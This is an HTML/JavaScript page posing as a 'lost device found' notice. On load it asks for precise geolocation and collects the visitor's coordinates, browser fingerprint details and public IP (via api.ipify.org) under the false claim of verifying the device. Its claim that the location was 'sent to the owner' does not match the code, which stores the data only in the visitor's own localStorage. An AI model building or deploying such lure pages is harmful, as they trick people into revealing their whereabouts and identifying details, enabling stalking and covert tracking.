<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lost Phone - Location Access</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 10px;
        }
        .message {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: left;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            color: #28a745;
            display: none;
            margin-top: 20px;
        }
        .error {
            color: #dc3545;
            display: none;
            margin-top: 20px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .contact-info {
            background: #e7f3ff;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="icon">📍</div>
        <h2>Lost Device Found?</h2>
        <p>This device has been marked as lost. Please help return it to the owner.</p>
        
        <div class="loader" id="loader"></div>
        <div id="status"></div>
        
        <div class="message" id="ownerMessage" style="display:none;"></div>
        <div class="success" id="successMsg">✓ Location captured! Thank you for your help!</div>
        <div class="error" id="errorMsg">❌ Location access denied. Unable to verify device.</div>
        
        <button onclick="requestLocationAgain()" id="retryBtn" style="display:none;">Try Again</button>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        
        if (!deviceId) {
            document.body.innerHTML = '<div class="container"><h2>Invalid Link</h2><p>This tracking link is invalid.</p></div>';
            throw new Error('No device ID');
        }
        
        // Load device info
        const devices = JSON.parse(localStorage.getItem('trackedDevices') || '[]');
        const device = devices.find(d => d.id === deviceId);
        
        if (device) {
            document.getElementById('ownerMessage').innerHTML = `
                <strong>📱 Device:</strong> ${device.deviceName}<br><br>
                <strong>👤 Owner's Contact:</strong><br>${device.contactInfo.replace(/\n/g, '<br>')}<br><br>
                ${device.reward ? `<strong>💰 Reward:</strong> ${device.reward}<br><br>` : ''}
                <strong>📍 Please allow location access</strong> - This helps verify the device location.
            `;
            document.getElementById('ownerMessage').style.display = 'block';
        }
        
        function getLocationAndTrack() {
            if (!navigator.geolocation) {
                showError('Geolocation is not supported by your browser');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(async (position) => {
                // Get additional info
                const locationData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenSize: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ip: await getIP()
                };
                
                // Save to localStorage
                const devices = JSON.parse(localStorage.getItem('trackedDevices') || '[]');
                const deviceIndex = devices.findIndex(d => d.id === deviceId);
                
                if (deviceIndex !== -1) {
                    devices[deviceIndex].clicks = (devices[deviceIndex].clicks || 0) + 1;
                    devices[deviceIndex].data = devices[deviceIndex].data || [];
                    devices[deviceIndex].data.push(locationData);
                    localStorage.setItem('trackedDevices', JSON.stringify(devices));
                }
                
                // Show success
                document.getElementById('loader').style.display = 'none';
                document.getElementById('successMsg').style.display = 'block';
                
                // Show owner contact prominently
                setTimeout(() => {
                    document.getElementById('mainContainer').innerHTML = `
                        <div class="icon">📞</div>
                        <h2>Thank You!</h2>
                        <p>Location has been sent to the owner.</p>
                        <div class="contact-info">
                            <strong>Contact the owner directly:</strong><br>
                            ${device.contactInfo.replace(/\n/g, '<br>')}
                        </div>
                        <button onclick="window.location.href='https://www.google.com'">Close</button>
                    `;
                }, 2000);
                
            }, (error) => {
                showError(getErrorMessage(error));
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }
        
        function getErrorMessage(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    return "Location access denied. Please enable location to verify.";
                case error.POSITION_UNAVAILABLE:
                    return "Location information unavailable.";
                case error.TIMEOUT:
                    return "Location request timed out.";
                default:
                    return "An unknown error occurred.";
            }
        }
        
        function showError(message) {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerHTML = `❌ ${message}`;
            document.getElementById('retryBtn').style.display = 'block';
        }
        
        function requestLocationAgain() {
            document.getElementById('loader').style.display = 'block';
            document.getElementById('errorMsg').style.display = 'none';
            document.getElementById('retryBtn').style.display = 'none';
            getLocationAndTrack();
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'Unable to fetch';
            }
        }
        
        // Start tracking immediately
        getLocationAndTrack();
    </script>
</body>
</html>
